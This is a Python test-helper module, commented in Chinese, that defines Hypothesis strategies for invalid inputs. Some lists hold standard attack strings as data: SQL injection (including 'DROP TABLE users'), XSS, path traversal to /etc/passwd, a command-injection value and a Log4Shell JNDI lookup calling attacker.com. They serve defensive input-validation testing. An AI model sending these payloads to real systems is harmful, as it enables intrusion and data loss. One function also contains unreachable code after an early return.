import random
from hypothesis import strategies as st
from hypothesis.strategies import composite
from typing import Optional, List, Dict, Any
from datetime import datetime, date, timedelta
import re
import string
from typing import Union, Optional, Dict, Any
import json


class ErrorStrategies:
    """错误类型验证策略"""

    @staticmethod
    def invalid_types(field_name: str, expected_type: type):
        """生成无效类型数据策略"""
        type_mapping = {
            int: st.one_of(
                st.text(),  # 字符串代替整数
                st.floats(),  # 浮点数代替整数
                st.booleans(),  # 布尔值代替整数
                st.none()  # 空值代替整数
            ),
            str: st.one_of(
                st.integers(),  # 整数代替字符串
                st.floats(),  # 浮点数代替字符串
                st.booleans(),  # 布尔值代替字符串
                st.none()  # 空值代替字符串
            ),
            bool: st.one_of(
                st.text(),  # 字符串代替布尔值
                st.integers(),  # 整数代替布尔值
                st.floats(),  # 浮点数代替布尔值
                st.none()  # 空值代替布尔值
            )
        }

        return type_mapping.get(expected_type, st.nothing())

    @staticmethod
    def sql_injection_vectors():
        """生成SQL注入测试向量"""
        return st.sampled_from([
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users; --",
            "' UNION SELECT username, password FROM users--",
            "' AND 1=1",
            "' OR 'a'='a"
        ])

    @staticmethod
    def xss_vectors():
        """生成XSS攻击测试向量"""
        return st.sampled_from([
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ])

    @staticmethod
    def path_traversal_vectors():
        """生成路径遍历攻击测试向量"""
        return st.sampled_from([
            "../../etc/passwd",
            "..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2fetc%2fpasswd",
            "....//....//etc/passwd"
        ])

    @staticmethod
    def overflow_values():
        """生成数值溢出测试数据"""
        return st.sampled_from([
            2147483647,  # 32位整数最大值
            2147483648,  # 超过32位整数最大值
            9223372036854775807,  # 64位整数最大值
            9223372036854775808,  # 超过64位整数最大值
            -2147483648,  # 32位整数最小值
            -2147483649,  # 低于32位整数最小值
            999999999999999999999  # 极大整数
        ])

    @staticmethod
    def empty_values(
            base_strategy: st.SearchStrategy[Any] = None,
            allow_none: bool = True,
            allow_empty_string: bool = True,
            allow_empty_list: bool = True,
            allow_empty_dict: bool = True,
            allow_nan: bool = True,
            allow_zero: bool = False,
            allow_false: bool = False
    ) -> st.SearchStrategy[Any]:
        """
        生成空值测试策略

        参数:
            base_strategy: 基础策略，如果提供，将生成该类型的空值
            allow_none: 是否允许None值
            allow_empty_string: 是否允许空字符串
            allow_empty_list: 是否允许空列表
            allow_empty_dict: 是否允许空字典
            allow_nan: 是否允许NaN值
            allow_zero: 是否允许0值（某些情况下0可能被视为空值）
            allow_false: 是否允许False值（某些情况下False可能被视为空值）

        返回:
            生成各种空值的策略
        """
        strategies = []

        if allow_none:
            strategies.append(st.none())
        if allow_empty_string:
            strategies.append(st.just(""))
        if allow_empty_list:
            strategies.append(st.just([]))
        if allow_empty_dict:
            strategies.append(st.just({}))
        if allow_nan:
            strategies.append(st.just(float('nan')))
        if allow_zero:
            strategies.append(st.just(0))
        if allow_false:
            strategies.append(st.just(False))

        if base_strategy is not None:
            # 生成基础类型的空值
            if isinstance(base_strategy, st.SearchStrategy):
                strategies.append(base_strategy.map(lambda x: None))
                strategies.append(base_strategy.map(lambda x: ""))
                strategies.append(base_strategy.map(lambda x: []))
                strategies.append(base_strategy.map(lambda x: {}))

        return st.one_of(strategies) if strategies else st.nothing()


    @staticmethod
    def invalid_emails(
            include_syntax_errors: bool = True,
            include_fake_domains: bool = True,
            include_disposable: bool = True,
            include_typos: bool = True,
            include_malformed: bool = True,
            include_obsolete: bool = True,
            include_risky_patterns: bool = True,
            custom_domains: Optional[List[str]] = None
    ) -> st.SearchStrategy[str]:
        """
        生成无效电子邮件地址测试策略

        参数:
            include_syntax_errors: 包含语法错误（缺少@符号、无效字符等）
            include_fake_domains: 包含虚假或不存在的域名
            include_disposable: 包含一次性/临时邮箱域名
            include_typos: 包含常见拼写错误
            include_malformed: 包含格式严重错误的邮箱
            include_obsolete: 包含已过时或不使用的邮箱格式
            include_risky_patterns: 包含可能引发安全问题的模式
            custom_domains: 自定义要包含的域名列表

        返回:
            生成无效电子邮件地址的策略
        """
        strategies = []

        # 语法错误邮箱 [1,3](@ref)
        if include_syntax_errors:
            syntax_errors = st.sampled_from([
                "user",  # 缺少@和域名
                "user@",  # @后无内容
                "@example.com",  # 缺少用户名
                "user@example",  # 缺少顶级域名
                "user@.com",  # 域名部分为空
                "user@example..com",  # 连续点号
                "user @example.com",  # 包含空格
                "user@example.c",  # 过短的顶级域名
                "user@example.123",  # 数字顶级域名
                "user@-example.com",  # 域名以连字符开头
                "user@example-.com",  # 域名以连字符结尾
            ])
            strategies.append(syntax_errors)

        # 虚假或不存在的域名 [1,2](@ref)
        if include_fake_domains:
            fake_domains = st.sampled_from([
                "user@nonexistent12345abc.com",
                "user@fake-domain-9999.org",
                "user@this-domain-does-not-exist.net",
                "user@invalid-test-domain.xyz",
                "user@example.invalid",  # .invalid 保留域
                "user@test.test",  # 不常见的顶级域名组合
                "user@localhost",  # 本地主机
                "user@192.168.1.1",  # IP地址格式（可能有效但常被拒绝）
            ])
            strategies.append(fake_domains)

        # 一次性/临时邮箱域名 [2,4](@ref)
        if include_disposable:
            disposable_domains = st.sampled_from([
                "user@tempmail.com",
                "user@10minutemail.com",
                "user@guerrillamail.com",
                "user@mailinator.com",
                "user@yopmail.com",
                "user@trashmail.com",
                "user@disposableemail.com",
                "user@fakeinbox.com",
                "user@throwawaymail.com",
            ])
            strategies.append(disposable_domains)

        # 常见拼写错误 [2,8](@ref)
        if include_typos:
            typo_domains = st.sampled_from([
                "user@gmial.com",  # gmail 拼写错误
                "user@gmaiil.com",
                "user@yahooo.com",  # yahoo 拼写错误
                "user@yaho.com",
                "user@hotmal.com",  # hotmail 拼写错误
                "user@hotmial.com",
                "user@outlook.cmo",  # .com 拼写错误
                "user@outlook.con",
                "user@gmil.com",
                "user@ail.com",  # mail 拼写错误
            ])
            strategies.append(typo_domains)

        # 格式严重错误的邮箱 [3,8](@ref)
        if include_malformed:
            malformed_emails = st.sampled_from([
                "user@example@com",  # 多个@符号
                "user@example@com@org",
                "user@example.com@",  # 尾部@符号
                "@user@example.com",  # 开头@符号
                "user@@example.com",  # 连续@符号
                "user@example..com",  # 连续点号
                "user@.example.com",  # 点号开头
                "user@example.com.",  # 点号结尾
                "user@exam_ple.com",  # 无效字符
                "user@exam ple.com",  # 空格
            ])
            strategies.append(malformed_emails)

        # 已过时或不使用的邮箱格式 [1](@ref)
        if include_obsolete:
            obsolete_emails = st.sampled_from([
                "user@aol.com",  # 使用较少的传统邮箱
                "user@compuserve.com",
                "user@prodigy.com",
                "user@msn.com",  # 可能仍有效但较少用于注册
                "user@icloud.com",  # 苹果用户但可能不活跃
                "user@bellsouth.net",  # 传统ISP邮箱
                "user@att.net",
            ])
            strategies.append(obsolete_emails)

        # 可能引发安全问题的模式 [6](@ref)
        if include_risky_patterns:
            risky_emails = st.sampled_from([
                "user@example.com' OR '1'='1",  # SQL注入尝试
                "user<script>alert('xss')</script>@example.com",  # XSS尝试
                "user@../../../etc/passwd",  # 路径遍历尝试
                "../../../etc/passwd@example.com",
                "user@example.com|ls -la",  # 命令注入尝试
                "${jndi:ldap://attacker.com/x}@example.com",  # Log4Shell尝试
            ])
            strategies.append(risky_emails)

        # 自定义域名
        if custom_domains:
            custom_strategy = st.sampled_from([
                f"user@{domain}" for domain in custom_domains
            ])
            strategies.append(custom_strategy)
        return st.one_of(strategies) if strategies else st.nothing()

        # 生成随机无效邮箱
        def generate_random_invalid():
            """生成随机无效邮箱"""
            username_chars = string.ascii_lowercase + string.digits + "._%+-"
            domain_chars = string.ascii_lowercase + string.digits + ".-"

            # 随机无效模式
            patterns = [
                # 缺少@
                lambda: ''.join(random.choices(username_chars, k=8)) +
                        ''.join(random.choices(domain_chars, k=10)) + ".com",
                # 多个@
                lambda: ''.join(random.choices(username_chars, k=6)) + "@@" +
                        ''.join(random.choices(domain_chars, k=8)) + ".com",
                # 无效字符
                lambda: ''.join(random.choices(username_chars, k=6)) + "@" +
                        ''.join(random.choices(domain_chars, k=8)) + "._invalid",
            ]

            return random.choice(patterns)()

        random_invalid = st.builds(generate_random_invalid)
        strategies.append(random_invalid)

        return st.one_of(strategies) if strategies else st.nothing()


    @staticmethod
    def email_typo_patterns() -> st.SearchStrategy[str]:
        """生成常见的电子邮件拼写错误模式"""
        return st.sampled_from([
            # 键盘邻近键错误
            "yser@example.com",  # u -> y (相邻键)
            "yser@example.com",  # u -> y
            "yser@example.com",  # u -> y
            "uset@example.com",  # r -> t (相邻键)
            "user@exanple.com",  # m -> n (相邻键)
            "user@examplr.com",  # e -> r (相邻键)

            # 字符重复或缺失
            "uuser@example.com",  # 重复字符
            "userr@example.com",
            "userexample.com",  # 缺少@
            "user@examplecom",  # 缺少.
            "user@example..com",  # 重复.

            # 字符顺序错误
            "uesr@example.com",  # 字符顺序错误
            "suer@example.com",
            "example@user.com",  # 用户名域名颠倒

            # 大小写和格式问题
            "USER@EXAMPLE.COM",  # 全大写（可能有效但非常规）
            "User@Example.Com",  # 非常规大小写
            "user@example.com ",  # 尾部空格
            " user@example.com",  # 前导空格
        ])

    @staticmethod
    def invalid_datetime_strings(
            include_format_violations: bool = True,
            include_nonexistent_dates: bool = True,
            include_incorrect_separators: bool = True,
            include_timezone_errors: bool = True,
            include_culture_conflicts: bool = True,
            include_overflow_values: bool = True,
            include_special_characters: bool = True,
            include_truncated_strings: bool = True,
            include_sql_injection: bool = True,
            custom_formats: Optional[List[str]] = None
    ) -> st.SearchStrategy[str]:
        """
        生成无效日期时间字符串测试策略

        参数:
            include_format_violations: 包含违反ISO 8601基本格式的字符串
            include_nonexistent_dates: 包含不存在的日期（如2月30日）
            include_incorrect_separators: 包含错误的分隔符
            include_timezone_errors: 包含时区格式错误
            include_culture_conflicts: 包含区域性格式冲突（如MM/DD/YYYY vs DD/MM/YYYY）
            include_overflow_values: 包含溢出的日期时间值（如25小时、70分钟）
            include_special_characters: 包含特殊字符
            include_truncated_strings: 包含被截断的字符串
            include_sql_injection: 包含SQL注入模式的日期时间字符串
            custom_formats: 自定义无效格式列表

        返回:
            生成无效日期时间字符串的策略
        """
        strategies = []

        # 违反ISO 8601格式的字符串 [1](@ref)
        if include_format_violations:
            format_violations = st.sampled_from([
                "2025-05-10 14:30:00",  # 缺少T分隔符
                "2025/05/10T14:30:00",  # 错误日期分隔符
                "2025-05-10T14:30",  # 缺少秒数
                "2025-5-10T14:30:00",  # 月份和日期未补零
                "25-05-10T14:30:00",  # 两位年份
                "May 10, 2025 14:30:00",  # 月份名称而非数字
                "10-05-2025T14:30:00",  # 日-月-年顺序错误
                "20250510T143000",  # 紧凑格式（非标准分隔）
                "2025-05-10 14:30:00.000",  # 毫秒但缺少T
            ])
            strategies.append(format_violations)

        # 不存在的日期 [6,7](@ref)
        if include_nonexistent_dates:
            nonexistent_dates = st.sampled_from([
                "2025-02-30T14:30:00",  # 2月30日不存在
                "2025-04-31T14:30:00",  # 4月只有30天
                "2025-06-31T14:30:00",  # 6月只有30天
                "2025-09-31T14:30:00",  # 9月只有30天
                "2025-11-31T14:30:00",  # 11月只有30天
                "2025-00-15T14:30:00",  # 月份为00
                "2025-13-15T14:30:00",  # 月份为13
                "2025-05-00T14:30:00",  # 日期为00
                "2025-05-32T14:30:00",  # 日期为32
                "2025-02-29T14:30:00",  # 非闰年的2月29日
            ])
            strategies.append(nonexistent_dates)

        # 错误的分隔符 [1,2](@ref)
        if include_incorrect_separators:
            incorrect_separators = st.sampled_from([
                "2025-05-10 14:30:00",  # 空格代替T
                "2025/05/10T14:30:00",  # 混合分隔符
                "2025.05.10T14.30.00",  # 点号作为时间分隔符
                "2025-05-10T14-30-00",  # 连字符作为时间分隔符
                "2025\\05\\10T14\\30\\00",  # 反斜杠分隔符
                "2025年05月10日14时30分00秒",  # 中文字符分隔
            ])
            strategies.append(incorrect_separators)

        # 时区格式错误 [1,6](@ref)
        if include_timezone_errors:
            timezone_errors = st.sampled_from([
                "2025-05-10T14:30:00+5:30",  # 时区缺少前导零
                "2025-05-10T14:30:00+0500",  # 时区缺少冒号
                "2025-05-10T14:30:00+5",  # 时区不完整
                "2025-05-10T14:30:00GMT",  # 文本时区而非偏移量
                "2025-05-10T14:30:00+25:00",  # 时区小时无效
                "2025-05-10T14:30:00+05:60",  # 时区分钟无效
                "2025-05-10T14:30:00+",  # 时区不完整
                "2025-05-10T14:30:00Z+05:30",  # Z和偏移量混合
            ])
            strategies.append(timezone_errors)

        # 区域性格式冲突 [3](@ref)
        if include_culture_conflicts:
            culture_conflicts = st.sampled_from([
                "12/31/2025 14:30:00",  # 美国格式（MM/DD/YYYY）
                "31/12/2025 14:30:00",  # 欧洲格式（DD/MM/YYYY）
                "31-12-2025T14:30:00",  # 混合分隔符和顺序
                "12-31-2025T14:30:00",  # 美国顺序但连字符分隔
                "2025/31/12T14:30:00",  # 年/日/月顺序
                "13/13/2025T14:30:00",  # 月份和日期都无效
            ])
            strategies.append(culture_conflicts)

        # 溢出的日期时间值 [6](@ref)
        if include_overflow_values:
            overflow_values = st.sampled_from([
                "2025-05-10T25:30:00",  # 25小时
                "2025-05-10T14:60:00",  # 60分钟
                "2025-05-10T14:30:60",  # 60秒
                "2025-05-10T14:30:00.1000",  # 毫秒溢出
                "2025-05-10T14:30:00.9999999999",  # 纳秒溢出
            ])
            strategies.append(overflow_values)

        # 包含特殊字符的日期时间字符串 [2](@ref)
        if include_special_characters:
            special_chars = st.sampled_from([
                "2025-05-10T14:30:00!",  # 尾部特殊字符
                "!2025-05-10T14:30:00",  # 头部特殊字符
                "2025-05-10T14:30:00|",  # 管道符
                "2025-05-10T14:30:00;",  # 分号
                "2025-05-10T14:30:00'",  # 单引号
                "2025-05-10T14:30:00\"",  # 双引号
                "2025-05-10T14:30:00\\",  # 反斜杠
                "2025-05-10T14:30:00/",  # 斜杠
                "2025-05-10T14:30:00@",  # @符号
            ])
            strategies.append(special_chars)

        # 被截断的字符串
        if include_truncated_strings:
            truncated_strings = st.sampled_from([
                "2025-05-10",  # 只有日期部分
                "14:30:00",  # 只有时间部分
                "2025-05-10T14",  # 缺少分钟和秒
                "2025-05-10T14:30",  # 缺少秒数
                "2025-05",  # 只有年和月
                "05-10",  # 只有月和日
                "T14:30:00",  # 只有时间部分带T
            ])
            strategies.append(truncated_strings)

        # SQL注入模式的日期时间字符串 [3](@ref)
        if include_sql_injection:
            sql_injection_datetime = st.sampled_from([
                "2025-05-10T14:30:00' OR '1'='1",
                "2025-05-10T14:30:00; DROP TABLE users; --",
                "2025-05-10T14:30:00' UNION SELECT NULL--",
                "2025-05-10T14:30:00' AND 1=1--",
                "2025-05-10T14:30:00' OR 'a'='a",
            ])
            strategies.append(sql_injection_datetime)

        # 自定义无效格式
        if custom_formats:
            custom_strategy = st.sampled_from(custom_formats)
            strategies.append(custom_strategy)
        return st.one_of(strategies) if strategies else st.nothing()

    @staticmethod
    def invalid_boolean_values(
            include_wrong_case: bool = True,
            include_numeric: bool = True,
            include_yes_no: bool = True,
            include_none: bool = True,
            include_empty: bool = True,
            include_special: bool = True,
            include_overflow: bool = True,
            include_sql_injection: bool = True,
            include_truncated: bool = True,
            custom_values: Optional[List[str]] = None
    ) -> st.SearchStrategy[str]:
        """
        生成无效布尔值测试策略

        参数:
            include_wrong_case: 包含大小写错误的布尔值
            include_numeric: 包含数字表示的布尔值
            include_yes_no: 包含是/否表示的布尔值
            include_none: 包含空值
            include_empty: 包含空字符串和空白值
            include_special: 包含特殊字符表示的布尔值
            include_overflow: 包含溢出数值
            include_sql_injection: 包含SQL注入模式的布尔值
            include_truncated: 包含截断的布尔值
            custom_values: 自定义无效值列表

        返回:
            生成无效布尔值的策略
        """
        strategies = []

        # 大小写错误的布尔值 [2,3](@ref)
        if include_wrong_case:
            wrong_case = st.sampled_from([
                "True",  # 首字母大写
                "False",  # 首字母大写
                "TRUE",  # 全大写
                "FALSE",  # 全大写
                "tRuE",  # 混合大小写
                "fAlSe",  # 混合大小写
            ])
            strategies.append(wrong_case)

        # 数字表示的布尔值 [2,3](@ref)
        if include_numeric:
            numeric_values = st.sampled_from([
                "1",  # 数字1
                "0",  # 数字0
                "-1",  # 负数
                "2",  # 大于1的数字
                "01",  # 前导零
                "00",  # 双零
            ])
            strategies.append(numeric_values)

        # 是/否表示的布尔值 [3](@ref)
        if include_yes_no:
            yes_no_values = st.sampled_from([
                "yes",
                "no",
                "Yes",
                "No",
                "YES",
                "NO",
                "y",
                "n",
                "Y",
                "N",
            ])
            strategies.append(yes_no_values)

        # 空值和null值 [2,3](@ref)
        if include_none:
            none_values = st.sampled_from([
                "null",
                "NULL",
                "Null",
                "undefined",
                "none",
                "None",
                "nil",
                "NaN",
            ])
            strategies.append(none_values)

        # 空字符串和空白值 [2](@ref)
        if include_empty:
            empty_values = st.sampled_from([
                "",  # 空字符串
                " ",  # 空格
                "  ",  # 多个空格
                "\t",  # 制表符
                "\n",  # 换行符
                "\r\n",  # 回车换行
            ])
            strategies.append(empty_values)

        # 特殊字符表示的布尔值 [1](@ref)
        if include_special:
            special_values = st.sampled_from([
                "t",  # 单字符t
                "f",  # 单字符f
                "T",  # 单字符T
                "F",  # 单字符F
                "on",  # 开关状态on
                "off",  # 开关状态off
                "ON",  # 全大写ON
                "OFF",  # 全大写OFF
            ])
            strategies.append(special_values)

        # 溢出数值 [1,2](@ref)
        if include_overflow:
            overflow_values = st.sampled_from([
                "2147483647",  # 32位整数最大值
                "2147483648",  # 超过32位整数最大值
                "999999999999999999999",  # 极大整数
                "-1",  # 负数
                "1.0",  # 浮点数
                "0.0",  # 零浮点数
                "1.5",  # 非整数浮点数
            ])
            strategies.append(overflow_values)

        # SQL注入模式的布尔值 [1](@ref)
        if include_sql_injection:
            sql_injection = st.sampled_from([
                "true' OR '1'='1",
                "false' OR 1=1--",
                "true; DROP TABLE users; --",
                "false' UNION SELECT NULL--",
                "' OR 'a'='a",
            ])
            strategies.append(sql_injection)

        # 截断的布尔值
        if include_truncated:
            truncated_values = st.sampled_from([
                "tru",  # 缺少e
                "fals",  # 缺少e
                "tr",  # 更短
                "fa",  # 更短
                "t",  # 单个t
                "f",  # 单个f
            ])
            strategies.append(truncated_values)

        # 自定义无效值
        if custom_values:
            custom_strategy = st.sampled_from(custom_values)
            strategies.append(custom_strategy)
        return st.one_of(strategies) if strategies else st.nothing()


error_strategies = ErrorStrategies()